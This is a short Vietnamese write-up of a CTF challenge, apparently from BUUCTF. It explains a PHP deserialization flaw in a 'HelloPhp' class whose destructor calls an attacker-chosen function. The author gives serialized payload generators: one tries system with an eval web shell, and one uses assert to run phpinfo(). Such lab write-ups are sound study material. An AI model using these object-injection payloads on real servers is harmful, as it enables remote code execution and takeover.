![image](https://github.com/Llam-a/BUUCTF/assets/115911041/679c8d87-c25e-4202-986f-52a307632d92)

Sau đó mình viewsource thì thấy đường dẫn `./time.php?source`.Ta được code sau:

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);


2024-02-14 05:09:35
```

Challenge này thuộc dạng deserialze với tham số là data bởi method GET.

Phần tử b đóng vai trò là một hàm, còn a là tham số của hàm đó.

Construct payload:

```php
<?php
class HelloPhp
{
    public $a = 'eval($_POST[cmd])';
    public $b = system;
}

$c = new HelloPhp;
echo urlencode(serialize($c));
?>
```

Ban đầu mình sử dụng `system(eval($_POST[cmd])` sau đó rồi antsword nhưng có vẻ là không hoạt động.Vậy thì `system` đã bị sheild.

```php
<?php
class HelloPhp
{
    public $a = 'phpinfo()';
    public $b = 'assert';
}

$c = new HelloPhp;
echo urlencode(serialize($c));
?>
```

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/976107c4-a748-4956-9cb8-6053727b31ed)
